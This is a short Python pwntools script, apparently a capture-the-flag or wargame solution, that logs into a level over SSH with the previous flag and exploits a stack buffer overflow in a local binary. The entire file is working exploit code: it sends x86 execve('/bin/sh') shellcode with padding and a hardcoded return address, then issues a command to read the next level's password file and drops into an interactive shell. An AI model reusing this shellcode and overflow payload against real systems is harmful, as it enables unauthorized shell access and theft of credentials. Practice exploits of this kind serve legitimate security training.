#!/usr/bin/env python3

from pwn import *
import os

flag_file = os.path.abspath(os.path.join(os.getcwd(), "level1/flag"))
host = input("Enter host IP: ")
port = int(input("Enter port: "))
login = "level2"
binary = login
password = open(flag_file, "r").read().strip()
remotebinary = f"/home/user/{login}/{binary}"
target_login = "level3"

shell = ssh(host=host, port=port, user=login, password=password)

return_address = p32(0x0804a008)
shellcode = (
    b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68"
    b"\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
)
padding = b"A" * (80 - len(shellcode))
payload = shellcode + padding + return_address

log.info("Payload length: %d bytes" % len(payload))

log.info("Spawning process and sending payload...")
p = shell.process([remotebinary])
p.sendline(payload)

# Lire le flag du niveau suivant
p.sendline(b"cat /home/user/" + target_login.encode() + b"/.pass")
p.interactive()
